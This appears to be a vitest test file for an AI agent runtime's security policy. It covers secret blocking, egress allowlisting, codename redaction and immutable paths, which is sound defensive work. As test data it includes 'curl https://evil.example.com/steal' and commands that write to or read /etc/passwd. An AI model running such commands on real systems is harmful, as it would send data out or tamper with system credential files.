import { describe, expect, it, beforeEach, afterEach } from "vitest";
import { promises as fs } from "node:fs";
import path from "node:path";
import os from "node:os";
import { AuditLog } from "../../src/runtime/audit.js";
import { enforcePostTool, enforcePreTool, isWriteTool, type PolicyContext } from "../../src/runtime/policy.js";
import type { CompiledIpGuard } from "../../src/util/policies.js";

let tmp: string;
let audit: AuditLog;

const baseCtx = (overrides: Partial<PolicyContext> = {}): PolicyContext => ({
  workingDirectory: tmp,
  immutablePaths: [],
  egress: null,
  ipGuard: null,
  offline: false,
  audit,
  agent: "dev",
  sessionId: "test-session",
  ...overrides,
});

beforeEach(async () => {
  tmp = await fs.mkdtemp(path.join(os.tmpdir(), "eas-policy-"));
  audit = new AuditLog(path.join(tmp, "audit"));
  await audit.init();
});
afterEach(async () => {
  await audit.close();
  await fs.rm(tmp, { recursive: true, force: true });
});

describe("isWriteTool", () => {
  it("flags Write/Edit", () => {
    expect(isWriteTool("Write", { path: "x" })).toBe(true);
    expect(isWriteTool("Edit", {})).toBe(true);
    expect(isWriteTool("Read", { path: "x" })).toBe(false);
  });
  it("flags Bash redirection", () => {
    expect(isWriteTool("Bash", { command: "echo hi > /tmp/x" })).toBe(true);
    expect(isWriteTool("Bash", { command: "tee /etc/passwd" })).toBe(true);
    expect(isWriteTool("Bash", { command: "cat /etc/passwd" })).toBe(false);
  });
});

describe("enforcePreTool — secrets in args", () => {
  it("blocks Write tool when args contain a secret", () => {
    const v = enforcePreTool("Write", { path: "config.txt", content: "TOKEN=ghp_" + "A".repeat(36) }, baseCtx());
    expect(v.decision).toBe("deny");
    expect(v.reason).toMatch(/secret/i);
  });
  it("warns but allows Read tool when args contain a secret", () => {
    const v = enforcePreTool("Read", { path: "ghp_" + "A".repeat(36) }, baseCtx());
    expect(v.decision).toBe("allow");
  });
  it("blocks Bash redirection containing a secret", () => {
    const v = enforcePreTool(
      "Bash",
      { command: "echo ghp_" + "A".repeat(36) + " > token.txt" },
      baseCtx(),
    );
    expect(v.decision).toBe("deny");
  });
});

describe("enforcePreTool — egress", () => {
  it("blocks unallowlisted host when policy is set", () => {
    const v = enforcePreTool(
      "Bash",
      { command: "curl https://evil.example.com/steal" },
      baseCtx({ egress: { allow: ["api.github.com"] } }),
    );
    expect(v.decision).toBe("deny");
    expect(v.reason).toMatch(/evil\.example\.com/);
  });
  it("allows allowlisted host", () => {
    const v = enforcePreTool(
      "Bash",
      { command: "curl https://api.github.com/repos" },
      baseCtx({ egress: { allow: ["api.github.com"] } }),
    );
    expect(v.decision).toBe("allow");
  });
  it("offline mode blocks all egress", () => {
    const v = enforcePreTool(
      "Bash",
      { command: "curl https://api.github.com/" },
      baseCtx({ offline: true, egress: { allow: ["api.github.com"] } }),
    );
    expect(v.decision).toBe("deny");
    expect(v.reason).toMatch(/[Oo]ffline/);
  });
  it("no enforcement when egress policy absent", () => {
    const v = enforcePreTool("Bash", { command: "curl https://anything.com" }, baseCtx());
    expect(v.decision).toBe("allow");
  });
});

describe("enforcePreTool — IP guard", () => {
  const guard: CompiledIpGuard = {
    mode: "block",
    patterns: [{ name: "codename", re: /Project Atlas/g }],
  };
  it("blocks matching args in block mode", () => {
    const v = enforcePreTool("Read", { path: "Project Atlas/spec.md" }, baseCtx({ ipGuard: guard }));
    expect(v.decision).toBe("deny");
    expect(v.reason).toMatch(/codename/);
  });
  it("redacts args in redact mode", () => {
    const redactGuard: CompiledIpGuard = { ...guard, mode: "redact" };
    const v = enforcePreTool(
      "Read",
      { path: "Project Atlas/spec.md", note: "see Project Atlas" },
      baseCtx({ ipGuard: redactGuard }),
    );
    expect(v.decision).toBe("allow");
    const args = v.modifiedArgs as { path: string; note: string };
    expect(args.path).toBe("[REDACTED:codename]/spec.md");
    expect(args.note).toBe("see [REDACTED:codename]");
  });
});

describe("enforcePostTool — output redaction", () => {
  it("redacts secrets in output", () => {
    const out = enforcePostTool(
      "Read",
      { textResultForLlm: "key is ghp_" + "A".repeat(36), resultType: "text" },
      baseCtx(),
    );
    expect(out.modifiedResult?.textResultForLlm).toContain("[REDACTED:github_pat]");
    expect(out.modifiedResult?.textResultForLlm).not.toContain("ghp_AAAA");
  });
  it("redacts IP-guard matches in output (redact mode)", () => {
    const guard: CompiledIpGuard = {
      mode: "redact",
      patterns: [{ name: "codename", re: /Project Atlas/g }],
    };
    const out = enforcePostTool(
      "Read",
      { textResultForLlm: "We deployed Project Atlas yesterday.", resultType: "text" },
      baseCtx({ ipGuard: guard }),
    );
    expect(out.modifiedResult?.textResultForLlm).toBe("We deployed [REDACTED:codename] yesterday.");
  });
  it("blocks IP-guard matches in output (block mode)", () => {
    const guard: CompiledIpGuard = {
      mode: "block",
      patterns: [{ name: "codename", re: /Project Atlas/g }],
    };
    const out = enforcePostTool(
      "Read",
      { textResultForLlm: "Internal: Project Atlas details.", resultType: "text" },
      baseCtx({ ipGuard: guard }),
    );
    expect(out.modifiedResult?.textResultForLlm).toMatch(/^\[BLOCKED:ip-guard/);
    expect(out.modifiedResult?.textResultForLlm).not.toContain("Project Atlas");
  });
  it("returns empty (no mutation) for clean output", () => {
    const out = enforcePostTool(
      "Read",
      { textResultForLlm: "plain text", resultType: "text" },
      baseCtx(),
    );
    expect(out.modifiedResult).toBeUndefined();
  });
});

describe("enforcePreTool — immutable paths", () => {
  it("blocks writes to immutable path", () => {
    const target = path.join(tmp, "frozen.md");
    const v = enforcePreTool(
      "Write",
      { path: "frozen.md", content: "ok" },
      baseCtx({ immutablePaths: [target] }),
    );
    expect(v.decision).toBe("deny");
    expect(v.reason).toMatch(/immutable/);
  });
});
